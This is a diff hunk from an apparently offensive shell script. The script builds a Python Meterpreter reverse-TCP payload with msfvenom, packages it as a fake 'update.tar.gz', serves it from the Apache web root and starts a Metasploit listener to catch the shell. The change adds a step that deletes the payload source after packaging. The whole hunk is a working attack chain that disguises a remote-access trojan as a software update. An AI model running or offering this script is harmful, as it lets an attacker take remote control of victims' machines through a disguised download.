@@ -70,6 +70,7 @@ msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/
         cd /root/Desktop/
 	tar -czvf update.tar.gz update.py
 	mv /root/Desktop/update.tar.gz /var/www/html
+		rm /root/Desktop/update.py
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
